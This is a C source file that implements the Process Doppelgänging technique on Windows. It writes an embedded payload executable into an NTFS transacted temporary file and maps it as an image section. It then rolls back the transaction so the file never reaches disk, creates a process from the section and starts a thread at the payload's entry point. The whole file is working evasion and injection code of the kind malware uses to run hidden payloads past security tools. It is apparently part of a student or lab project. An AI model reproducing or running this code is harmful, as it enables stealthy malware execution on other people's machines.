#include <windows.h>
#include <stdio.h>
#include "../common/embedded_dll.h"

// Process Doppelgänging Implementation:
// 1. Create NTFS Transaction via NtCreateTransaction or CreateTransaction (Ktmw32.dll)
// 2. Open transacted file via CreateFileTransactedA
// 3. Write payload PE into the transacted file
// 4. Create image Section Object from transacted file via NtCreateSection(SEC_IMAGE)
// 5. Rollback transaction via RollbackTransaction / NtRollbackTransaction (changes never committed to disk!)
// 6. Create process from section via NtCreateProcessEx

typedef LONG NTSTATUS;
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES {
    ULONG           Length;
    HANDLE          RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG           Attributes;
    PVOID           SecurityDescriptor;
    PVOID           SecurityQualityOfService;
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

typedef NTSTATUS (NTAPI *pfnNtCreateSection)(
    PHANDLE SectionHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PLARGE_INTEGER MaximumSize,
    ULONG SectionPageProtection,
    ULONG AllocationAttributes,
    HANDLE FileHandle
);

typedef NTSTATUS (NTAPI *pfnNtCreateProcessEx)(
    PHANDLE ProcessHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    HANDLE ParentProcess,
    ULONG Flags,
    HANDLE SectionHandle,
    HANDLE DebugPort,
    HANDLE ExceptionPort,
    ULONG JobMemberLevel
);

typedef HANDLE (WINAPI *pfnCreateTransaction)(
    LPSECURITY_ATTRIBUTES lpTransactionAttributes,
    LPGUID UOW,
    DWORD CreateOptions,
    DWORD IsolationLevel,
    DWORD IsolationFlags,
    DWORD Timeout,
    LPWSTR Description
);

typedef BOOL (WINAPI *pfnRollbackTransaction)(HANDLE Transaction);

typedef NTSTATUS (NTAPI *pfnNtCreateThreadEx)(
    PHANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    HANDLE ProcessHandle,
    PVOID StartRoutine,
    PVOID Argument,
    ULONG CreateFlags,
    ULONG_PTR ZeroBits,
    SIZE_T StackSize,
    SIZE_T MaximumStackSize,
    PVOID AttributeList
);

typedef HANDLE (WINAPI *pfnCreateFileTransactedA)(
    LPCSTR lpFileName,
    DWORD dwDesiredAccess,
    DWORD dwShareMode,
    LPSECURITY_ATTRIBUTES lpSecurityAttributes,
    DWORD dwCreationDisposition,
    DWORD dwFlagsAndAttributes,
    HANDLE hTemplateFile,
    HANDLE hTransaction,
    PUSHORT pusMiniVersion,
    PVOID pExtendedParameter
);

int main() {
    HMODULE hKtm = LoadLibraryA("ktmw32.dll");
    if (!hKtm) return 1;

    pfnCreateTransaction CreateTransaction = (pfnCreateTransaction)GetProcAddress(hKtm, "CreateTransaction");
    pfnRollbackTransaction RollbackTransaction = (pfnRollbackTransaction)GetProcAddress(hKtm, "RollbackTransaction");
    pfnCreateFileTransactedA CreateFileTransactedA = (pfnCreateFileTransactedA)GetProcAddress(hKtm, "CreateFileTransactedA");

    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    pfnNtCreateSection NtCreateSection = (pfnNtCreateSection)GetProcAddress(hNtdll, "NtCreateSection");
    pfnNtCreateProcessEx NtCreateProcessEx = (pfnNtCreateProcessEx)GetProcAddress(hNtdll, "NtCreateProcessEx");
    pfnNtCreateThreadEx NtCreateThreadEx = (pfnNtCreateThreadEx)GetProcAddress(hNtdll, "NtCreateThreadEx");

    if (!CreateTransaction || !RollbackTransaction || !CreateFileTransactedA || !NtCreateSection) {
        return 1;
    }

    // 1. Create NTFS Transaction
    HANDLE hTransaction = CreateTransaction(NULL, 0, 0, 0, 0, 0, L"KLTN-Doppel");
    if (hTransaction == INVALID_HANDLE_VALUE) return 1;

    // 2. Open transacted file in temp folder
    char tempPath[MAX_PATH];
    char tempFile[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPath);
    GetTempFileNameA(tempPath, "dop", 0, tempFile);

    HANDLE hTransactedFile = CreateFileTransactedA(
        tempFile,
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL,
        hTransaction,
        NULL,
        NULL
    );

    if (hTransactedFile == INVALID_HANDLE_VALUE) {
        CloseHandle(hTransaction);
        return 1;
    }

    // 3. Write payload PE into transacted file
    DWORD written = 0;
    WriteFile(hTransactedFile, embedded_dll, embedded_dll_len, &written, NULL);

    // 4. Create image Section Object from the transacted file
    HANDLE hSection = NULL;
    NTSTATUS status = NtCreateSection(
        &hSection,
        SECTION_ALL_ACCESS,
        NULL,
        NULL,
        PAGE_READONLY,
        SEC_IMAGE,
        hTransactedFile
    );

    // Close transacted file handle
    CloseHandle(hTransactedFile);

    // 5. Rollback transaction: changes never touch disk! File disappears cleanly
    RollbackTransaction(hTransaction);
    CloseHandle(hTransaction);

    if (status != STATUS_SUCCESS || !hSection) {
        return 1;
    }

    // 6. Create process from section
    HANDLE hProcess = NULL;
    if (NtCreateProcessEx) {
        status = NtCreateProcessEx(
            &hProcess,
            PROCESS_ALL_ACCESS,
            NULL,
            GetCurrentProcess(),
            0,
            hSection,
            NULL,
            NULL,
            0
        );
    }

    if (hProcess && NtCreateThreadEx) {
        PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)embedded_dll;
        PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(embedded_dll + dos->e_lfanew);
        PVOID entryPoint = (PVOID)(nt->OptionalHeader.ImageBase + nt->OptionalHeader.AddressOfEntryPoint);

        HANDLE hThread = NULL;
        status = NtCreateThreadEx(
            &hThread,
            THREAD_ALL_ACCESS,
            NULL,
            hProcess,
            entryPoint,
            NULL,
            0,
            0,
            0,
            0,
            NULL
        );
        if (hThread) {
            WaitForSingleObject(hThread, 5000);
            CloseHandle(hThread);
        }
        CloseHandle(hProcess);
    } else if (hProcess) {
        CloseHandle(hProcess);
    }

    CloseHandle(hSection);
    return 0;
}
